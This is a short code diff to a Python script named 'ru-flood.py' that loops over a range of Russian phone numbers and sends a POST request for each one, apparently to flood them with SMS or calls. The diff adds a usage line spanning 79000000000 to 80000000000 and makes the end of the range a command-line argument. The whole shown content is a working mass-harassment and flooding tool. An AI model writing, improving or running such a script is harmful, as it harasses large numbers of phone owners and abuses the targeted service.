@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+# ./ru-flood.py 79000000000 80000000000
 
 import requests
 from random import random
@@ -20,5 +21,5 @@ def flood(phone):
     response = session.post(url=url, headers={"X-Requested-With": "XMLHttpRequest"})
     print(phone + ":" + response.content.decode())
 
-for i in range(int(argv[1]), 80000000000):
+for i in range(int(argv[1]), int(argv[2])):
     flood(str(i))
